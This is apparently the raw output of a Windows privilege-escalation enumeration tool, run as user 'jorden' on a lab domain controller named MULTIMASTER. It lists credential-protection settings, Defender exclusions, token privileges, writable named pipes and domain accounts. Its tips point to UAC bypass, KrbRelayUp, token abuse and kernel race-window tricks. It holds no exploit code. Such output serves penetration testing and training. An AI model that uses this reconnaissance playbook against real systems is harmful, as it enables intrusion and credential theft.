    PROCESSOR_LEVEL: 25
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\jorden
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 0101
    USERNAME: jorden
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\jorden\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\jorden\AppData\Roaming
    TMP: C:\Users\jorden\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: MEGACORP
    USERDNSDOMAIN: MEGACORP.LOCAL

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables (T1082)
È Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Microsoft SQL Server\140\DTS\Binn\;C:\Program Files\Microsoft SQL Server\140\DTS\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft\Web Platform Installer\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings (T1562.002)
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced (T1562.002)

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings (T1562.002)
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings (T1003.004)
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest (T1003.001)
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest                                                                                                                                                          
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection (T1003.001)
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection                                                                 
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard (T1003.001)
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard                                                                                                                                                     
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds (T1003.005)
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials                                                                                                                   
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass) (T1552.002)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information (T1518.001)
  [X] Exception: Access denied 
    No AV was detected!!
    whitelistpaths:     C:\Users\Administrator\Documents
    C:\Users\Administrator\Documents\PowerView.ps1
    C:\Users\Administrator\Documents\PowerShdll.dll
    C:\Users\Administrator\Documents\revert.ps1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration (T1518.001)
  Local Settings

  Path Exclusions:
    C:\Users\Administrator\Documents
    C:\Users\Administrator\Documents\PowerView.ps1
    C:\Users\Administrator\Documents\PowerShdll.dll
    C:\Users\Administrator\Documents\revert.ps1

  PolicyManagerPathExclusions:
    C:\Users\Administrator\Documents
    C:\Users\Administrator\Documents\PowerView.ps1
    C:\Users\Administrator\Documents\PowerShdll.dll
    C:\Users\Administrator\Documents\revert.ps1
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status (T1548.002)
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss                                                                                     
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                                                            

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings (T1059.001)
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.14393.0
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry (T1059.001)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history (T1552.001)
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings (T1082)
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings (T1082)
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information (T1082)
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 5 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])
    E:\ (Type: Fixed)(Volume label: Data)(Filesystem: NTFS)(Available space: 2 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS (T1072,T1068)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp (T1187,T1558)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (MEGACORP) so it could be vulnerable.
È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container (T1613)
È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated (T1548.002)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Object Manager race-window amplification primitives (T1068)
È Project Zero write-up: https://projectzero.google/2025/12/windows-exploitation-techniques.html
    Created a test named event (PEAS_OMNS_5596_98297db36f2f42d3b363d4a44429513c) under \BaseNamedObjects.
È     -> Low-privileged users can slow NtOpen*/NtCreate* lookups using ~32k-character names or ~16k-level directory chains.
È     -> Point attacker-controlled symbolic links to the slow path to stretch kernel race windows.
È     -> Use this whenever a bug follows check -> NtOpenX -> privileged action patterns.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
 (T1547.005)                                                                                                                                                
    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       620
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings (T1557.001)
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                                                            

  NTLM Signing Settings                                                                                                                                     
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                                                          
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                                                            

  NTLM Auditing and Restrictions                                                                                                                            
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine (T1082)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Potential GPO abuse vectors (applied domain GPOs writable by current user) (T1484.001)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ PrintNightmare PointAndPrint Policies (T1068)
È Check PointAndPrint policy hardening https://itm4n.github.io/printnightmare-exploitation/
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI) (T1082)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes (T1559)
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  RpcProxy\49674                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)

  RpcProxy\593                                                                                         Everyone [Allow: WriteData/CreateFiles]                                O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)

  sql\query                                                                                            Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)

  SQLLocal\MSSQLSERVER                                                                                 Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Named Pipes with Low-Priv Write Access to Privileged Servers (T1134.001,T1559)
    \\.\pipe\eventlog
      Low-priv ACLs  : Everyone [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]
      Observed owners: No privileged handles observed (service idle or access denied)
      SDDL           : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
   =================================================================================================

    \\.\pipe\RpcProxy\49674
      Low-priv ACLs  : Everyone [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]; NT AUTHORITY\ANONYMOUS LOGON [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]
      Observed owners: No privileged handles observed (service idle or access denied)
      SDDL           : O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)
   =================================================================================================

    \\.\pipe\RpcProxy\593
      Low-priv ACLs  : Everyone [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]; NT AUTHORITY\ANONYMOUS LOGON [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]
      Observed owners: No privileged handles observed (service idle or access denied)
      SDDL           : O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)
   =================================================================================================

    \\.\pipe\sql\query
      Low-priv ACLs  : Everyone [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]
      Observed owners: No privileged handles observed (service idle or access denied)
      SDDL           : O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)
   =================================================================================================

    \\.\pipe\SQLLocal\MSSQLSERVER
      Low-priv ACLs  : Everyone [CreateFiles|WriteAttributes|WriteData|WriteExtendedAttributes]
      Observed owners: No privileged handles observed (service idle or access denied)
      SDDL           : O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)
   =================================================================================================

    \\.\pipe\vgauth-service
      Low-priv ACLs  : Everyone [AppendData|CreateDirectories|CreateFiles|Write|WriteAttributes|WriteData|WriteExtendedAttributes]
      Observed owners: No privileged handles observed (service idle or access denied)
      SDDL           : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers (T1562.001)
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\MpOav.dll"

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration (T1518.001)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1) (T1654)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
 (T1082)                                                                                                                                                    


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information (T1654,T1078,T1078.003,T1552.001,T1059.001,T1082) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
 (T1078.003)                                                                                                                                                
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.
 (T1654,T1078)                                                                                                                                              
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.
 (T1654)                                                                                                                                                    
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
 (T1552.001,T1059.001)                                                                                                                                      

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days
 (T1082)                                                                                                                                                    
  5/14/2026 2:34:05 AM    :  Startup


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information (T1087.001,T1087.004,T1033,T1134.001,T1115,T1563.002,T1083,T1552.002,T1201) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                                                                                                               

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users (T1087.001)
È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups                                                                                                                                                      
  [X] Exception: Object reference not set to an instance of an object.
  Current user: jorden
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Server Operators, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, Developers, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time (T1033)
   Current User   :     MEGACORP\jorden
   Idle Time      :     22h:00m:11s:312ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status) (T1087.004)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges (T1134.001)
È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation                                                                                                                                       
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeSystemtimePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeBackupPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeRestorePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeRemoteShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeTimeZonePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text (T1115)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users (T1033)
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users (T1087.001)
   Computer Name           :   MULTIMASTER
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   5/15/2026 12:33:39 AM
   Logons Count            :   47066
   Password Last Set       :   9/28/2019 2:09:13 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/25/2019 6:20:06 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   svc-nas
   User Id                 :   1103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   9/25/2019 1:48:42 PM
   Logons Count            :   1
   Password Last Set       :   9/28/2019 2:36:56 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   tushikikatomo
   User Id                 :   1110
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   5/14/2026 8:05:16 PM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 6:02:03 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   andrew
   User Id                 :   1111
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/28/2019 4:43:00 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   lana
   User Id                 :   1112
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/28/2019 4:42:03 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   alice
   User Id                 :   1601
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/28/2019 4:40:45 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   dai
   User Id                 :   2101
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/28/2019 2:24:41 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   svc-sql
   User Id                 :   2102
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/28/2019 2:46:00 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   sbauer
   User Id                 :   3102
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   5/14/2026 11:03:29 PM
   Logons Count            :   1
   Password Last Set       :   1/9/2020 5:56:31 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   okent
   User Id                 :   3103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:23:09 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   ckane
   User Id                 :   3104
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:23:35 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   kpage
   User Id                 :   3105
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:24:16 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   james
   User Id                 :   3106
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:24:43 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   cyork
   User Id                 :   3107
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   5/14/2026 2:35:29 AM
   Logons Count            :   32
   Password Last Set       :   1/9/2020 12:57:08 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   rmartin
   User Id                 :   3108
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:25:27 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   zac
   User Id                 :   3109
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:26:06 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   jorden
   User Id                 :   3110
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   5/14/2026 11:12:38 PM
   Logons Count            :   2
   Password Last Set       :   1/9/2020 5:48:17 PM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   alyx
   User Id                 :   3111
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:27:06 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   ilee
   User Id                 :   3112
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:27:24 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   nbourne
   User Id                 :   3113
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:27:45 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   zpowers
   User Id                 :   3114
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:28:28 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   aldom
   User Id                 :   3115
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:28:53 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   jsmmons
   User Id                 :   3116
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:29:14 AM

   =================================================================================================

   Computer Name           :   MULTIMASTER
   User Name               :   pmartin
   User Id                 :   3117
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/9/2020 5:29:39 AM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions (T1563.002)
È Disconnected high-privilege RDP sessions keep reusable tokens inside LSASS. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/credentials-mgmt/rdp-sessions                                                                                                                        
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users (T1033)
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found (T1083)
    C:\Users\.NET v4.5
    C:\Users\.NET v4.5 Classic
    C:\Users\Administrator
    C:\Users\alcibiades
    C:\Users\All Users
    C:\Users\cyork
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jorden : jorden [Allow: AllAccess]
    C:\Users\MSSQLSERVER
    C:\Users\Public
    C:\Users\sbauer
    C:\Users\SQLTELEMETRY

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  MEGACORP
    DefaultUserName               :  cyork

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies (T1201)
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: MEGACORP
    SID: S-1-5-21-3167813660-1240564177-918740779
    MaxPasswordAge: -10675199.02:48:05.4775808
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: 0
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions (T1033)


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information (T1057,T1134.001) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft- (T1057)
